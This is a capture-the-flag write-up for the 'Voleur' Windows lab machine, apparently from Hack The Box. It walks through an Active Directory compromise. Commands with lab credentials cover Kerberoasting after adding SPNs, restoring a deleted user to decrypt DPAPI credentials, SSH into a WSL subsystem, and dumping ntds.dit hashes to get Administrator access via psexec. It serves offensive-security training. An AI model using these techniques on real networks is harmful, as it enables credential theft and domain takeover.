Summary
#

Voleur is a medium-difficulty Windows machine that simulates an assumed-breach scenario by providing low-privileged domain credentials from the outset. The engagement takes place in an Active Directory environment where NTLM authentication is disabled, requiring Kerberos-based authentication throughout. After enumerating network services and SMB shares, a password-protected Excel spreadsheet is discovered and its password is recovered through offline cracking. The spreadsheet reveals domain credentials, leading to further Active Directory enumeration and a targeted Kerberoasting attack that compromises a service account with remote management access. Using delegated group privileges, a previously deleted domain user is restored, enabling access to DPAPI-protected credentials that reveal a higher-privileged account. Further enumeration uncovers an SSH private key for a backup service account, providing access to a Linux subsystem hosted on the Domain Controller. Finally, backup copies of the Active Directory database and registry hives are extracted to recover the Administrator’s NTLM hash, resulting in full domain compromise.

#

Enumerating SMB Shares
#

As the description of machine provided the initial credentials (ryan.naylor : HollowOct31Nyt), we can use these to enumerate the SMB shares:

└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares

SMB         10.129.232.130  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED

The hostname of the target is identified as DC so we need to add the following hostname entries to our /etc/hosts file for the proper working of our tools that interact with Domain Controller:

└─$ cat /etc/hosts 

10.129.232.130 voleur.htb DC.voleur.htb DC

Enumerating Active Directory
#

After obtaining the credentials of 3 accounts, we can move on to collecting the Active Directory data with BloodHound for easy visualization via GUI and planning our next attack path. Before collecting the data, we need to get a TGT for our user as BloodHound collector supports Kerberos ticket if used with the variable KRB5CCNAME:

└─$ impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.129.232.130
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache

Set the ticket to the environment variable:

└─$ export KRB5CCNAME=ryan.naylor.ccache

Now we can successfully utilize BloodHound collector via Kerberos authentication:

└─$ bloodhound-ce-python -c all -u 'ryan.naylor' -d 'voleur.htb' -ns 10.129.232.130 -dc DC.voleur.htb --dns-tcp --zip --dns-timeout 90 -k -no-pass

<SNIP>
INFO: Done in 00M 26S
INFO: Compressing output into 20260701232524_bloodhound.zip

Start the BloodHound GUI and upload the zip file. Checking the outbound privileges of the users we have access to, we identified that svc_ldap has privileges over 3 objects

With these privileges, we can add SPNs on the 2 users shown in the screenshot above and try Kerberoasting attack to crack their password:

└─$ addspn -u 'voleur.htb\svc_ldap' -p 'M1XyC9pW7qT5Vn' -s 'pwn/pwn' -t 'SVC_WINRM' -T 'samname' -k DC.voleur.htb

└─$ impacket-GetUserSPNs voleur.htb/ryan.naylor:HollowOct31Nyt -k -dc-host DC.voleur.htb -request -outputfile TGS-Hashes.txt

The hashes are extracted and stored in a file. To crack them using hashcat, mode 13100 is used:

└─$ hashcat -m 13100 TGS-Hashes.txt /usr/share/wordlists/rockyou.txt

Login as svc_winrm
#

The service account svc_winrm is present in the Remote Management Users group which allows us to access the host via WinRM. To get the Kerberos ticket:

└─$ impacket-getTGT voleur.htb/svc_winrm:<PASSWORD> -dc-ip 10.129.232.130

We need to set the following configuration below the [realm] heading in /etc/krb5.conf before using Kerberos ticket with evil-winrm:

VOLEUR.HTB = {
		kdc = DC.voleur.htb
		admin_server = DC.voleur.htb
}

Now we can use evil-winrm to log in:

└─$ evil-winrm -i DC.voleur.htb -r voleur.htb -K svc_winrm.ccache

The user.txt is present on the desktop of svc_winrm

Escalating Privileges
#

Restoring the Deleted User
#

The svc_ldap service account is a member of the Restore_Users group so it may become possible for us to restore the deleted account of todd.wolfe user. We can check the write permissions for svc_ldap via Bloodyad as privileges over deleted objects are not shown in BloodHound GUI.

└─$ bloodyad -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -i '10.129.232.130' -H 'DC.voleur.htb' -k get writable 

<SNIP>

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

<SNIP>

We have WRITE permissions on it so it is possible for us to recover the deleted account. We need the SID of the user which we want to restore and we can find it by:

└─$ bloodyad -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -i '10.129.232.130' -H 'DC.voleur.htb' -k get search -c 1.2.840.113556.1.4.2064 --base 'CN=Deleted Objects,DC=voleur,DC=htb' --filter '(&(objectClass=user)(sAMAccountName=Todd.Wolfe))' --attr distinguishedName,sAMAccountName,objectSid,objectClass

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
objectClass: top; person; organizationalPerson; user
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110
sAMAccountName: todd.wolfe

To recover the account of todd.wolfe:

└─$ bloodyad -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -i '10.129.232.130' -H 'DC.voleur.htb' -k set restore S-1-5-21-3927696377-1337352550-2781715495-1110
[+] S-1-5-21-3927696377-1337352550-2781715495-1110 has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb

NOTE: After some time, the todd.wolfe account is automatically deleted so restore the deleted account again to move further.

Recovering DPAPI-Protected Credentials
#

We can now authenticate as todd.wolfe and enumerate the SMB shares again:

└─$ impacket-getTGT voleur.htb/todd.wolfe:NightT1meP1dg3on14 -dc-ip 10.129.232.130     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache

Accessing shares with impacket-smbclient:

└─$ impacket-smbclient voleur.htb/todd.wolfe@DC.voleur.htb -k -no-pass

Enumerating the share, we found that in the “Second-Line Support” folder, the archived home directory of todd.wolfe is available and the usual Desktop, Documents, Downloads etc folders don’t contain anything. In the AppData\Roaming\Microsoft\Protect, the user’s DPAPI master key is present and in AppData\Roaming\Microsoft\Credentials, a DPAPI-encrypted credential blob is also present. We can download both the files and use impacket-dpapi tool to decrypt the master key and then decrypt the protected credential:

└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

Domain Compromise
#

We get the credentials of jeremy.combs in the decrypted data. Continuing the enumeration of the SMB share via the newly acquired credentials, we found an id_rsa private key with a Note.txt.txt file in the “Third-Line Support” folder. The note contains:

Jeremy,
I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
Please see what you can set up.
Thanks,
Admin

The share folder also contains a Backup directory which denied access.

After copying the private key to our system, we can check if the file contains the key comment via:

└─$ ssh-keygen -y -f id_rsa

On port 2222, SSH server is available because WSL installed on the system and we can connect to it using the key and username we identified:

└─$ ssh -i id_rsa svc_backup@10.129.232.130 -p 2222

On the system, we can escalate to root simply by typing “sudo su”. As the Windows system is running the WSL, the first step is to check if anything from the host system is mounted. In the /mnt, the C drive from the host system is mounted. We can now check if we can access the “Backup” folder we were denied access before.

These files contain the Active Directory database and registry hives required to extract domain credential material. We can download them by starting a Python HTTP server in the WSL Linux and using curl from our system. To parse the hives:

└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL

In the output, the NTLM password hashes of the domain users are extracted. We can use the Administrator’s hash with impacket-psexec to access the system:

└─$ impacket-psexec voleur.htb/Administrator@DC.voleur.htb -k -no-pass
